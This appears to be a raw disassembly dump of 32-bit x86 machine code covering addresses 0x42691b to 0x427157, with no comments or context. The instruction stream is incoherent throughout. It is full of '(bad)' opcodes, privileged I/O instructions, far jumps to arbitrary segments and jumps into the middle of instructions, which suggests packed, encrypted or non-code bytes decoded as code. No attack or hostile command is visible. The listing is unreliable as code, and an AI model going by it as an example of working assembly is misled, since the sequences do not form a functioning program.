  42691b:	(bad)  
  42691c:	push   0xaa4514de
  426921:	xchg   edx,eax
  426922:	mov    BYTE PTR [ecx],ah
  426924:	js     0x426922
  426926:	or     ecx,DWORD PTR [edi]
  426928:	inc    edx
  426929:	fsubr  st,st(0)
  42692b:	retf   
  42692c:	not    DWORD PTR [ebp+0x31bda3b0]
  426932:	pop    esp
  426933:	or     esp,ebx
  426935:	sub    esp,DWORD PTR [edx-0x2c0dea8f]
  42693b:	sar    BYTE PTR [ebx+eax*2+0x14],1
  42693f:	mov    ah,0xeb
  426941:	and    bh,BYTE PTR [ecx-0x76d423f5]
  426947:	xchg   ebp,eax
  426948:	pop    eax
  426949:	jmp    0x4269b9
  42694b:	imul   ebx,edx,0x46cce49
  426951:	push   edx
  426952:	(bad)  
  426953:	iret   
  426954:	mov    al,0xc2
  426956:	stos   BYTE PTR es:[edi],al
  426957:	dec    ecx
  426958:	jmp    0xde58:0xaa254c4c
  42695f:	jmp    0x13ed:0x6403cf54
  426966:	and    BYTE PTR [esp+edi*2],ch
  426969:	ret    
  42696a:	xchg   ebp,eax
  42696b:	jo     0x426909
  42696d:	adc    eax,0xeb7e934e
  426972:	(bad)  
  426975:	std    
  426976:	cli    
  426977:	int3   
  426978:	or     ebp,DWORD PTR [esi-0x6b]
  42697b:	xchg   esp,esp
  42697d:	or     cl,BYTE PTR [edi]
  42697f:	std    
  426980:	je     0x4269b0
  426982:	mov    ebx,0x54037a0f
  426987:	ror    DWORD PTR [ebx+0x13],cl
  42698a:	xor    edx,ebx
  42698c:	int    0xb3
  42698e:	or     al,dh
  426990:	mov    edx,0xcffd11fd
  426995:	add    DWORD PTR [edx-0x6d],esi
  426998:	sbb    DWORD PTR [ebx+ecx*4-0xc0cde84],esp
  42699f:	mov    fs,ebp
  4269a1:	add    BYTE PTR [esp+edi*2],dl
  4269a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269a5:	in     eax,0xc
  4269a7:	popa   
  4269a8:	fsub   QWORD PTR [edi]
  4269aa:	push   edi
  4269ab:	mov    ch,0xdc
  4269ad:	push   0xc02de030
  4269b2:	jle    0x42698b
  4269b4:	int3   
  4269b5:	pop    ds
  4269b6:	jno    0x426a23
  4269b8:	ss or  ecx,edi
  4269bb:	jno    0x4269e4
  4269bd:	sbb    ebx,DWORD PTR [ebx-0x1e]
  4269c0:	dec    ebx
  4269c1:	(bad)  
  4269c2:	and    al,0x3c
  4269c4:	test   eax,0xe05ceac0
  4269c9:	sbb    al,0xda
  4269cb:	push   ebp
  4269cc:	fidivr WORD PTR [ebp-0x7f892c12]
  4269d3:	mov    fs:0x21b7ab01,eax
  4269d9:	dec    ebp
  4269da:	(bad)  
  4269db:	cld    
  4269dc:	pop    esi
  4269dd:	sbb    ebx,DWORD PTR [edi]
  4269df:	sub    DWORD PTR [ebp+0x2e],ebp
  4269e2:	mov    al,0xe7
  4269e4:	jno    0x4269a2
  4269e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269e7:	adc    BYTE PTR [esi+0x67],0xcc
  4269eb:	fwait
  4269ec:	push   ebx
  4269ed:	leave  
  4269ee:	outs   dx,BYTE PTR ds:[esi]
  4269ef:	pop    esi
  4269f0:	sahf   
  4269f1:	addr16 mov bl,0x65
  4269f4:	rcr    DWORD PTR [edi-0x7d6c3650],0xa0
  4269fb:	(bad)  
  4269fc:	adc    DWORD PTR [ebp+0x40],edi
  4269ff:	fwait
  426a00:	sub    bl,BYTE PTR [ecx-0x410462e5]
  426a06:	int    0xb4
  426a08:	lods   al,BYTE PTR cs:[esi]
  426a0a:	push   ebp
  426a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a0c:	cmp    BYTE PTR [esi-0x23],0xc7
  426a10:	rcl    DWORD PTR [esi+0xd63acde],cl
  426a16:	and    DWORD PTR [eax],esi
  426a18:	stos   BYTE PTR es:[edi],al
  426a19:	sub    esp,DWORD PTR [ecx+edx*8]
  426a1c:	pop    ss
  426a1d:	or     esi,edx
  426a1f:	shl    BYTE PTR [ebx],cl
  426a21:	mov    ch,BYTE PTR [eax-0x5f6ec13a]
  426a27:	inc    ebx
  426a28:	mov    eax,ebx
  426a2a:	mov    edx,0xee6c1358
  426a2f:	idiv   BYTE PTR [ebp+0x30]
  426a32:	jns    0x4269cf
  426a34:	push   esi
  426a35:	rep stos BYTE PTR es:[edi],al
  426a37:	lds    eax,FWORD PTR [esi-0x3ad173a9]
  426a3d:	sbb    ebp,DWORD PTR ds:0xbda878ac
  426a43:	cmp    DWORD PTR [edx-0x14e7bd19],esi
  426a49:	mov    si,WORD PTR [edx+0x29947fc7]
  426a50:	fld    QWORD PTR [ebx-0x2]
  426a53:	pop    es
  426a54:	loope  0x4269dd
  426a56:	loopne 0x426a22
  426a58:	jg     0x426a46
  426a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a5b:	mov    ds:0x55da4398,eax
  426a60:	outs   dx,BYTE PTR ds:[esi]
  426a61:	shl    ebp,cl
  426a63:	jns    0x426a35
  426a65:	stos   DWORD PTR es:[edi],eax
  426a66:	jne    0x426a70
  426a68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a69:	mov    al,0x1d
  426a6b:	mov    WORD PTR [edx],fs
  426a6d:	ror    BYTE PTR [ecx],1
  426a6f:	(bad)  
  426a70:	cmp    BYTE PTR [ecx+0x26],ch
  426a73:	xlat   BYTE PTR ds:[ebx]
  426a74:	rcl    DWORD PTR [eax-0x19],0x1d
  426a78:	inc    edx
  426a79:	push   ss
  426a7a:	aaa    
  426a7b:	fstp   DWORD PTR [esp+eax*8+0x1c]
  426a7f:	sub    BYTE PTR [edi],cl
  426a81:	mov    WORD PTR [eax-0x2d44acb1],gs
  426a87:	inc    esp
  426a88:	das    
  426a89:	mov    ebp,0xc9c9c346
  426a8e:	mov    ecx,DWORD PTR [edi-0x5e]
  426a91:	xor    ah,bh
  426a93:	mov    ebx,ss
  426a95:	fnstcw WORD PTR [edx]
  426a97:	dec    ebx
  426a98:	jge    0x426a20
  426a9a:	inc    esi
  426a9b:	sbb    eax,DWORD PTR [edx]
  426a9d:	(bad)  
  426a9f:	dec    ebx
  426aa0:	mov    bl,0x73
  426aa2:	ins    BYTE PTR es:[edi],dx
  426aa3:	or     eax,0x18c40ebb
  426aa8:	clc    
  426aa9:	fwait
  426aaa:	sti    
  426aab:	jecxz  0x426aa8
  426aad:	mov    esp,0x4efe9780
  426ab2:	test   al,0xac
  426ab4:	inc    edi
  426ab5:	sub    eax,0x4ab6675a
  426aba:	addr16 add al,0x6
  426abd:	hlt    
  426abe:	nop
  426abf:	jge    0x426a84
  426ac1:	cmp    al,0xb3
  426ac3:	sbb    dl,ch
  426ac5:	push   0x18cb3062
  426aca:	inc    ebx
  426acb:	sbb    DWORD PTR [esi-0x53],0x6238b5b8
  426ad2:	gs add ebx,edi
  426ad5:	dec    ebp
  426ad6:	lahf   
  426ad7:	or     al,0x2e
  426ad9:	mov    al,ds:0xe578851c
  426ade:	mov    edx,0xf2a97c80
  426ae3:	test   eax,0xd34bb6a
  426ae8:	or     eax,0x3d517903
  426aed:	push   ds
  426aee:	sub    ebp,ebx
  426af0:	sub    DWORD PTR [esi],edx
  426af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426af3:	sahf   
  426af4:	je     0x426b06
  426af6:	sub    eax,0x7b819bcf
  426afb:	sub    dl,ah
  426afd:	popa   
  426afe:	xchg   esp,eax
  426aff:	pushf  
  426b00:	jb     0x426b30
  426b02:	mov    ds:0x16ad9fbe,eax
  426b07:	mov    ch,0xec
  426b09:	xchg   edi,eax
  426b0a:	xor    eax,0x48602faf
  426b0f:	jl     0x426b39
  426b11:	push   ss
  426b12:	or     eax,0xee1922b1
  426b17:	ret    0x9a60
  426b1a:	cld    
  426b1b:	adc    eax,0xca0e32fb
  426b20:	adc    al,0x9
  426b22:	fdivrp st(7),st
  426b24:	iret   
  426b25:	sbb    edi,DWORD PTR [edi+0x39f33513]
  426b2b:	or     al,0xb4
  426b2d:	jp     0x426ab2
  426b2f:	popa   
  426b30:	mov    ecx,0x13bf78fe
  426b35:	add    al,0x86
  426b37:	push   ecx
  426b38:	pushf  
  426b39:	jnp    0x426af9
  426b3b:	mov    dl,BYTE PTR [esi-0x46]
  426b3e:	push   ecx
  426b3f:	stos   DWORD PTR es:[edi],eax
  426b40:	lahf   
  426b41:	mov    ecx,0x2bdd0747
  426b46:	adc    eax,DWORD PTR [esi-0x2e]
  426b49:	fst    QWORD PTR [esi]
  426b4b:	jne    0x426b52
  426b4d:	rol    BYTE PTR [ecx],0x54
  426b50:	push   ss
  426b51:	pop    ss
  426b52:	add    DWORD PTR [esi+0x5a],ebx
  426b55:	pushf  
  426b56:	xchg   ecx,eax
  426b57:	ins    DWORD PTR es:[edi],dx
  426b58:	adc    esp,DWORD PTR [eax-0x630492f]
  426b5e:	cmp    esp,DWORD PTR [eax+0x60]
  426b61:	ins    DWORD PTR es:[edi],dx
  426b62:	cmp    eax,0x88d1bba
  426b67:	repz pop ebp
  426b69:	dec    ebx
  426b6a:	fwait
  426b6b:	jmp    0x95f6b74c
  426b70:	mov    cl,0xea
  426b72:	push   eax
  426b73:	cmp    eax,0xd7b643c0
  426b78:	inc    edx
  426b79:	jne    0x426b87
  426b7b:	inc    ebx
  426b7c:	jp     0x426b5f
  426b7e:	mov    ss,esp
  426b80:	dec    ebx
  426b81:	sar    DWORD PTR [edx+0x32d4a0ab],1
  426b87:	dec    esp
  426b88:	mov    dl,0xe2
  426b8a:	sbb    dh,BYTE PTR [edx+0x6d]
  426b8d:	jge    0x426bfb
  426b8f:	out    0x6b,al
  426b91:	dec    ecx
  426b92:	cmp    DWORD PTR [ebx+0x4bb6178d],ebp
  426b98:	enter  0x9075,0x5b
  426b9c:	mov    esp,0x8f480071
  426ba1:	or     DWORD PTR [edx],ebx
  426ba3:	dec    esp
  426ba4:	lods   al,BYTE PTR ds:[esi]
  426ba5:	mov    esp,0xc0d2c651
  426baa:	mov    bh,0x90
  426bac:	mov    BYTE PTR [ebx],al
  426bae:	and    ch,BYTE PTR [eax+eax*8+0x2530ff7]
  426bb5:	cdq    
  426bb6:	cmc    
  426bb7:	jmp    0x426c03
  426bb9:	mov    esp,0x9f1ecc47
  426bbe:	push   ebx
  426bbf:	push   ebx
  426bc0:	xchg   edx,eax
  426bc1:	fadd   QWORD PTR [eax+0x3bd8a16c]
  426bc7:	(bad)  
  426bc8:	sar    DWORD PTR [esi-0x399f3175],cl
  426bce:	js     0x426c3b
  426bd0:	jge    0x426ba8
  426bd2:	aam    0x1
  426bd4:	push   edx
  426bd5:	jmp    0x161b:0xa3856b18
  426bdc:	jnp    0x426c51
  426bde:	(bad)  
  426bdf:	cli    
  426be0:	mov    esi,0x438ee7fd
  426be5:	stos   DWORD PTR es:[edi],eax
  426be6:	out    dx,eax
  426be7:	gs je  0x426c37
  426bea:	xor    BYTE PTR [edx-0x4f],0xa
  426bee:	hlt    
  426bef:	lahf   
  426bf0:	mov    DWORD PTR [esi-0x75f68258],eax
  426bf6:	xchg   ebx,eax
  426bf7:	test   al,0xbb
  426bf9:	jbe    0x426bf5
  426bfb:	mov    edi,0xf582c515
  426c00:	(bad)  
  426c01:	or     al,0x24
  426c03:	dec    esp
  426c04:	jl     0x426c4d
  426c06:	mov    edi,DWORD PTR [ebx+0x4f94a228]
  426c0c:	xor    DWORD PTR [ebx+ebp*4],ebx
  426c0f:	add    BYTE PTR [esi+0x24],ch
  426c12:	xchg   edx,eax
  426c13:	xor    dl,ch
  426c15:	push   ebx
  426c16:	pushf  
  426c17:	mov    ebp,0xe5bd80fa
  426c1c:	fimul  WORD PTR ds:0xb296e1b4
  426c22:	das    
  426c23:	xor    bh,BYTE PTR [edi+0x26]
  426c26:	mov    esi,ebx
  426c28:	xchg   ecx,eax
  426c29:	mov    ebx,0xecb014f
  426c2e:	pop    ecx
  426c2f:	fidiv  DWORD PTR [ebp+0x54cc1b65]
  426c35:	adc    BYTE PTR [ebx-0x5],ah
  426c38:	fnstenv [ecx+eiz*4-0x1d]
  426c3c:	add    al,BYTE PTR [edx+0x13]
  426c3f:	lods   eax,DWORD PTR ds:[esi]
  426c40:	loop   0x426c3a
  426c42:	xchg   ebp,eax
  426c43:	mov    ch,0x7b
  426c45:	mov    ecx,0xea73e8df
  426c4a:	cli    
  426c4b:	mov    DWORD PTR [ebx-0x4b620bc0],eax
  426c51:	mov    ah,0x87
  426c53:	xor    dl,BYTE PTR [ebp+edx*1+0xf]
  426c57:	pop    es
  426c58:	inc    esp
  426c59:	(bad)  
  426c5a:	xor    ecx,DWORD PTR [eax]
  426c5c:	mov    ebp,edi
  426c5e:	in     al,dx
  426c5f:	retf   0xa36
  426c62:	fsubr  QWORD PTR [edi+ebx*8]
  426c65:	ficomp WORD PTR [edx+0x6d]
  426c68:	dec    ebx
  426c69:	xor    al,BYTE PTR [ecx-0x75]
  426c6c:	outs   dx,BYTE PTR ds:[esi]
  426c6e:	pop    esi
  426c6f:	cdq    
  426c70:	cmp    eax,0x382b6729
  426c75:	stos   DWORD PTR es:[edi],eax
  426c76:	in     eax,dx
  426c77:	jp     0x426c06
  426c79:	mov    al,ds:0xccf0d2d4
  426c7e:	out    dx,eax
  426c7f:	dec    edi
  426c80:	push   0xffffffb7
  426c82:	mov    ebp,0xe37fd88b
  426c87:	fdivr  DWORD PTR [bx-0x2245]
  426c8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c8d:	mov    dh,0xa3
  426c8f:	ds jle 0x426cae
  426c92:	xlat   BYTE PTR ds:[ebx]
  426c93:	imul   esp,DWORD PTR [eax-0xa],0x65
	...
  426d13:	add    BYTE PTR ds:0x55d31474,ah
  426d19:	repz out 0xf6,eax
  426d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d1d:	adc    bh,BYTE PTR [esi]
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	inc    esi
  426d21:	je     0x426d0a
  426d23:	loope  0x426d4b
  426d25:	inc    BYTE PTR [ecx]
  426d27:	add    BYTE PTR [ebx+0x7],ch
  426d2a:	add    BYTE PTR [eax],al
  426d2c:	dec    eax
  426d2d:	jmp    0xe3db6ea2
  426d32:	or     BYTE PTR [eax-0x15480751],bl
  426d38:	mov    ebx,0x22f7d80a
  426d3d:	(bad)  
  426d3e:	adc    DWORD PTR [ebx-0x2326b3df],0x49
  426d45:	xor    al,bh
  426d47:	xchg   edi,eax
  426d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426d49:	sbb    eax,0x3153495b
  426d4e:	not    ch
  426d50:	je     0x426cf3
  426d52:	pop    ds
  426d53:	mov    ebx,0x7cbddde
  426d58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426d59:	sbb    DWORD PTR ds:0xe0bcf14b,edi
  426d5f:	mov    esi,0xab4730d9
  426d64:	(bad)  
  426d66:	imul   ecx,DWORD PTR [ebx-0x7],0x7556bdcf
  426d6d:	pop    edi
  426d6e:	in     eax,dx
  426d6f:	out    dx,al
  426d70:	mov    ecx,0xd8c7038c
  426d75:	dec    ebx
  426d76:	jg     0x426d09
  426d78:	int3   
  426d79:	add    ch,BYTE PTR [ecx+0x5b]
  426d7c:	pop    eax
  426d7d:	jo     0x426dc2
  426d7f:	dec    ebp
  426d80:	inc    ebp
  426d81:	push   0x46
  426d83:	lock idiv BYTE PTR ds:0x93350ae8
  426d8a:	fistp  DWORD PTR [esi+0x7d427fe0]
  426d90:	mov    al,ds:0xfdd18042
  426d95:	jo     0x426dd5
  426d97:	inc    DWORD PTR [ebx-0x2eecbd93]
  426d9d:	mov    al,0x8
  426d9f:	(bad)  
  426da0:	cmp    al,al
  426da2:	jae    0x426deb
  426da4:	jmp    0x426d6a
  426da6:	pop    esp
  426da7:	xchg   edx,eax
  426da8:	add    al,BYTE PTR [ebp-0x4c732fce]
  426dae:	les    edx,FWORD PTR [bp+di+0x3f]
  426db2:	test   bh,0xc7
  426db5:	fiadd  WORD PTR [eax]
  426db7:	in     al,0x11
  426db9:	jo     0x426e15
  426dbb:	adc    DWORD PTR [edx],0x3b
  426dbe:	or     DWORD PTR [ebp-0x4ed9c75c],ecx
  426dc4:	test   BYTE PTR [ebx],0x66
  426dc7:	cld    
  426dc8:	add    esi,ebp
  426dca:	fwait
  426dcb:	push   es
  426dcc:	cld    
  426dcd:	add    al,0x7f
  426dcf:	mov    al,ds:0xd738e2cf
  426dd4:	fsub   QWORD PTR [ebx-0x37bcb889]
  426dda:	leave  
  426ddb:	retf   0xd41b
  426dde:	arpl   si,si
  426de0:	adc    eax,0x88dbd5a3
  426de5:	lea    ebp,[edi-0x18087d6c]
  426deb:	retf   0xb47e
  426dee:	sar    DWORD PTR [ebx+0x1a],1
  426df1:	ds inc edi
  426df3:	xor    DWORD PTR [ecx-0xbb03f62],esi
  426df9:	mov    esp,0xf8e7a89e
  426dfe:	mov    esp,DWORD PTR [ebp+0x73]
  426e01:	aad    0xfd
  426e03:	ror    DWORD PTR ds:0x74458cd,1
  426e09:	sub    BYTE PTR [ecx-0x1dd66eea],ch
  426e0f:	mov    eax,ds:0x39b0eaf7
  426e14:	jge    0x426e02
  426e16:	arpl   WORD PTR ds:0xb9f3a847,bp
  426e1c:	gs add ebp,ebp
  426e1f:	mov    al,0x27
  426e21:	fmul   DWORD PTR [eax+0x478cf314]
  426e27:	or     esp,DWORD PTR [ecx]
  426e29:	cli    
  426e2a:	(bad)  
  426e2b:	out    0xd0,al
  426e2d:	and    eax,0xe28a4009
  426e32:	in     al,0xa6
  426e34:	adc    ebp,0x9bc0da01
  426e3a:	cmc    
  426e3b:	mov    al,ds:0x631ebdac
  426e40:	mov    ds:0x18cc497e,al
  426e45:	ds das 
  426e47:	mov    eax,ds:0x10b0f002
  426e4c:	jo     0x426de2
  426e4e:	and    ebp,0x20040f3d
  426e54:	mov    dh,0x8b
  426e56:	and    ch,BYTE PTR [ecx+0x62]
  426e59:	xor    al,BYTE PTR [eax-0x33]
  426e5c:	mov    cl,0xa7
  426e5e:	retf   
  426e5f:	sub    BYTE PTR [edi],cl
  426e61:	mov    ds:0x542a9a0f,al
  426e66:	fstp   TBYTE PTR [ebp+eax*1-0x43]
  426e6a:	rcl    BYTE PTR [bx+di-0x36],cl
  426e6e:	jg     0x426eeb
  426e70:	add    esi,edx
  426e72:	adc    al,0xd9
  426e74:	mov    edi,0x504727ba
  426e79:	xor    eax,0xe7903b8d
  426e7e:	stos   DWORD PTR es:[edi],eax
  426e7f:	or     ah,cl
  426e81:	hlt    
  426e82:	std    
  426e83:	popa   
  426e84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e85:	jne    0x8f72090
  426e8b:	fwait
  426e8c:	push   esp
  426e8d:	fsubr  DWORD PTR [ecx]
  426e8f:	fidivr WORD PTR [ebp-0x2]
  426e92:	push   edi
  426e93:	leave  
  426e94:	mov    edi,0xbc35f34a
  426e99:	mov    es,WORD PTR [ecx-0x3d8f1f4d]
  426e9f:	xchg   edi,eax
  426ea0:	xor    DWORD PTR [ebx+0x57],0x62
  426ea4:	xchg   ebx,eax
  426ea5:	jecxz  0x426f20
  426ea7:	ins    BYTE PTR es:[edi],dx
  426ea8:	imul   ecx,DWORD PTR [eax+edx*2],0x2e7d5889
  426eaf:	mov    bh,0x92
  426eb1:	mov    ah,0x59
  426eb3:	outs   dx,BYTE PTR ds:[esi]
  426eb4:	outs   dx,DWORD PTR ds:[esi]
  426eb5:	or     ecx,DWORD PTR [ecx+edx*2]
  426eb8:	pop    es
  426eb9:	repnz pop ds
  426ebb:	dec    ecx
  426ebc:	leave  
  426ebd:	push   ss
  426ebe:	sub    dh,BYTE PTR [esp+edx*2+0x3c5fda13]
  426ec5:	fnstcw WORD PTR [eax]
  426ec7:	jae    0x426e93
  426ec9:	xor    esi,DWORD PTR [esi]
  426ecb:	adc    BYTE PTR [eax+0x11],dl
  426ece:	es leave 
  426ed0:	out    dx,eax
  426ed1:	rcr    edx,0x2e
  426ed4:	jmp    0x426f4d
  426ed6:	push   ecx
  426ed7:	adc    DWORD PTR [esi],esi
  426ed9:	jmp    0x426f33
  426edb:	(bad)  
  426edc:	fbstp  TBYTE PTR [edi]
  426ede:	aad    0xb5
  426ee0:	lock or bh,BYTE PTR [esi-0x44]
  426ee4:	fld    QWORD PTR [eax]
  426ee6:	lea    edx,[esi+0x6]
  426ee9:	test   BYTE PTR [ebx+0x59],dl
  426eec:	lods   al,BYTE PTR ds:[esi]
  426eed:	pusha  
  426eee:	or     DWORD PTR [edi+0x281617cb],0x13957c5f
  426ef8:	dec    ebp
  426ef9:	idiv   BYTE PTR [esi+0x5dbfcb35]
  426eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f00:	inc    esi
  426f01:	dec    edx
  426f02:	pusha  
  426f03:	sub    BYTE PTR [esi],bh
  426f05:	shl    DWORD PTR [esi+0x780b0e9f],0x25
  426f0c:	(bad)  
  426f0d:	scas   al,BYTE PTR es:[edi]
  426f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f0f:	inc    esp
  426f10:	jae    0x426ecb
  426f12:	sbb    edx,eax
  426f14:	or     DWORD PTR [eax+0x738e1f49],edx
  426f1a:	loop   0x426f2d
  426f1c:	sub    ebp,DWORD PTR ds:[ebx-0x51728d55]
  426f23:	push   esp
  426f24:	fcmovbe st,st(5)
  426f26:	inc    ebp
  426f27:	je     0x426ed1
  426f29:	adc    DWORD PTR [ebp-0x42322771],edx
  426f2f:	ror    ah,1
  426f31:	pop    ss
  426f32:	jb     0x426ed0
  426f34:	mov    bl,0xc
  426f36:	or     eax,0x150a7982
  426f3b:	mov    WORD PTR [esi+0x67],es
  426f3e:	pop    edx
  426f3f:	cmp    DWORD PTR [esi+esi*2],eax
  426f42:	(bad)  
  426f43:	arpl   WORD PTR [edi],di
  426f45:	inc    ecx
  426f46:	dec    eax
  426f47:	pop    ebp
  426f48:	push   ss
  426f49:	mov    bl,0xa6
  426f4b:	inc    ebp
  426f4c:	lods   al,BYTE PTR ds:[esi]
  426f4d:	pop    ds
  426f4e:	out    dx,eax
  426f4f:	jl     0x426f24
  426f51:	jne    0x426eee
  426f53:	iret   
  426f54:	mov    ds:0x7d55c30d,eax
  426f59:	in     eax,dx
  426f5a:	(bad)  
  426f5b:	pop    esi
  426f5c:	imul   edx,DWORD PTR ds:0x6c273360,0x22
  426f63:	dec    esp
  426f64:	dec    esi
  426f65:	das    
  426f66:	pop    ebx
  426f67:	ficomp WORD PTR [ebx+edx*4+0x62]
  426f6b:	push   ecx
  426f6c:	and    esi,DWORD PTR [ecx+0xe]
  426f6f:	inc    ebp
  426f70:	(bad)
  426f73:	fdivr  DWORD PTR ds:0x639627b6
  426f79:	sub    bh,BYTE PTR [ebx*1+0x5d405ae8]
  426f80:	and    edx,DWORD PTR [esi-0x164a652e]
  426f86:	xchg   esi,eax
  426f87:	xor    ebp,esi
  426f89:	cmp    eax,0x3bf2b57f
  426f8e:	stos   DWORD PTR es:[edi],eax
  426f8f:	test   esp,0x75558b19
  426f95:	push   0xa545139f
  426f9a:	mov    bl,0x3f
  426f9c:	add    al,0xf3
  426f9e:	ds pushw ds
  426fa1:	mov    al,ds:0xe3a25a41
  426fa6:	xor    BYTE PTR [eax],0x2d
  426fa9:	mov    esi,0x2c22ca68
  426fae:	mov    eax,0xf1f1d3da
  426fb3:	rcr    DWORD PTR [ecx],cl
  426fb5:	jmp    0xd898720e
  426fba:	xor    bh,cl
  426fbc:	into   
  426fbd:	int3   
  426fbe:	mov    ch,0xce
  426fc0:	call   0xa6db54e8
  426fc5:	not    BYTE PTR [edi]
  426fc7:	or     al,0x5d
  426fc9:	cmp    esi,DWORD PTR [ebp-0x3b]
  426fcc:	push   0xffffff9f
  426fce:	retf   0xc99d
  426fd1:	gs std 
  426fd3:	inc    esi
  426fd4:	mov    ecx,0x8efb203d
  426fd9:	xor    esp,DWORD PTR [bp+di]
  426fdc:	test   BYTE PTR [ebp-0x4efe27a6],dl
  426fe2:	inc    edx
  426fe3:	dec    ebx
  426fe4:	xchg   BYTE PTR [ebp+0x7bbcaac8],ah
  426fea:	inc    eax
  426feb:	xchg   BYTE PTR [ecx],dh
  426fed:	(bad)  
  426fee:	jbe    0x42701a
  426ff0:	jecxz  0x426fa5
  426ff2:	sub    edx,DWORD PTR ds:0x65d7bef5
  426ff8:	mov    ebp,0x68622c02
  426ffd:	repnz mov BYTE PTR [edx+0x907d955],bh
  427004:	in     eax,0x99
  427006:	xchg   esp,eax
  427007:	outs   dx,DWORD PTR ds:[esi]
  427008:	(bad)  
  427009:	sub    al,0x60
  42700b:	fist   WORD PTR [ebx+0x18609dd8]
  427011:	mov    dh,0x4
  427013:	(bad)  
  427014:	cwde   
  427015:	leave  
  427016:	rol    BYTE PTR [ebx+0x201b4770],cl
  42701c:	sbb    DWORD PTR [eax+edi*2-0x3a],ebx
  427020:	loope  0x427083
  427022:	jl     0x42705b
  427024:	pop    es
  427025:	out    dx,eax
  427026:	nop
  427027:	outs   dx,DWORD PTR ds:[esi]
  427028:	jbe    0x42707b
  42702a:	sbb    eax,0x50c692cd
  42702f:	fs and ebx,ebp
  427032:	adc    al,0xc5
  427034:	xor    eax,ebx
  427036:	push   es
  427037:	lods   eax,DWORD PTR ds:[esi]
  427038:	inc    esi
  427039:	fisubr WORD PTR [ebx]
  42703b:	pop    edi
  42703c:	lahf   
  42703d:	pop    edi
  42703e:	xchg   ebp,eax
  42703f:	imul   edi,DWORD PTR [esi],0xffffffbb
  427042:	inc    ebx
  427043:	cdq    
  427044:	mov    WORD PTR [ebx],fs
  427046:	pop    edx
  427047:	jle    0x42703e
  427049:	or     ebx,DWORD PTR [edx]
  42704b:	sbb    BYTE PTR [edx],cl
  42704d:	aas    
  42704e:	pop    ebx
  42704f:	xchg   edi,eax
  427050:	jg     0x427044
  427052:	mov    edx,0x3cda35ec
  427057:	clc    
  427058:	pop    es
  427059:	jo     0x427022
  42705b:	xchg   esi,eax
  42705c:	xchg   ebx,eax
  42705d:	xor    al,0x31
  42705f:	mov    esp,0x5541d3f
  427064:	sbb    dl,bl
  427066:	or     BYTE PTR [esi-0x61],dl
  427069:	int3   
  42706a:	xor    BYTE PTR [ecx-0x72],0x90
  42706e:	adc    BYTE PTR [ebx-0x48],dl
  427071:	jnp    0x4270bf
  427073:	jmp    0xe1dc:0x98532e78
  42707a:	mov    bh,0x61
  42707c:	clc    
  42707d:	jno    0x42709f
  42707f:	ror    BYTE PTR ds:0x136440c0,1
  427085:	out    dx,eax
  427086:	jecxz  0x427091
  427088:	xor    cl,BYTE PTR [ecx]
  42708a:	cmp    eax,0x2d24bbc8
  42708f:	fwait
  427090:	std    
  427091:	hlt    
  427092:	cmc    
  427093:	dec    ebp
  427094:	pop    ss
  427095:	fwait
  427096:	pmullw mm5,QWORD PTR [ebx+esi*4+0x10]
  42709b:	cmp    edi,ebp
  42709d:	cwde   
  42709e:	mov    al,ds:0x10ce27c7
  4270a3:	cs jnp 0x42708c
  4270a6:	mov    ebx,0xaabc3062
  4270ab:	mov    bl,0xb5
  4270ad:	ffreep st(1)
  4270af:	rcr    bl,cl
  4270b1:	repz jp 0x4270a7
  4270b4:	push   0xce5e72c1
  4270b9:	adc    eax,0xaa08ef79
  4270be:	jp     0x4270ec
  4270c0:	jge    0x427105
  4270c2:	mov    ds:0x310ec159,al
  4270c7:	mov    cl,0x3f
  4270c9:	shr    DWORD PTR [edx-0x1bcd1d66],cl
  4270cf:	das    
  4270d0:	imul   ecx,DWORD PTR [eax],0x590d4a83
  4270d6:	cmp    eax,0x4ea53d5d
  4270db:	cld    
  4270dc:	mov    eax,ds:0xb2d29688
  4270e1:	add    eax,0x66ce9102
  4270e6:	add    al,0x3c
  4270e8:	jle    0x4270f6
  4270ea:	popf   
  4270eb:	add    al,0xba
  4270ed:	cmp    esi,DWORD PTR es:[ecx-0x79bd85f0]
  4270f4:	xlat   BYTE PTR ds:[ebx]
  4270f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270f6:	inc    DWORD PTR [ebx+0x21]
  4270f9:	mov    ds:0xc355948,al
  4270fe:	cli    
  4270ff:	dec    esi
  427100:	and    BYTE PTR [edx],dh
  427102:	leave  
  427103:	push   es
  427104:	or     al,0x2e
  427106:	(bad)  
  427107:	pushf  
  427108:	arpl   WORD PTR [edi],si
  42710a:	add    esp,edi
  42710c:	cmp    esi,DWORD PTR [edx-0x7a]
  42710f:	inc    edx
  427110:	imul   eax,DWORD PTR [edx],0xffffffbc
  427113:	mov    ecx,edx
  427115:	dec    ebx
  427116:	mov    bl,0x6f
  427118:	sti    
  427119:	outs   dx,DWORD PTR ds:[esi]
  42711a:	cmp    eax,0x3bfe9afb
  42711f:	(bad)  
  427120:	dec    ebx
  427121:	loopne 0x427123
  427123:	jbe    0x42711c
  427125:	cmp    BYTE PTR [ebx+0x51b685c8],bl
  42712b:	in     eax,dx
  42712c:	and    ecx,DWORD PTR [eax]
  42712e:	adc    DWORD PTR [edx+0x6c5b8830],esp
  427134:	fwait
  427135:	jmp    0x2668:0xde8bcee1
  42713c:	das    
  42713d:	out    0xb0,al
  42713f:	jmp    0x25a8:0x40bdc4ab
  427146:	mov    cl,0x12
  427148:	add    al,0xf3
  42714a:	pop    eax
  42714b:	es ret 
  42714d:	sub    BYTE PTR [ebx],dl
  42714f:	pop    eax
  427150:	pop    edi
  427151:	adc    ebp,DWORD PTR [eax+0x9]
  427154:	cmp    ch,BYTE PTR [eax-0x56]
  427157:	aam    0x10
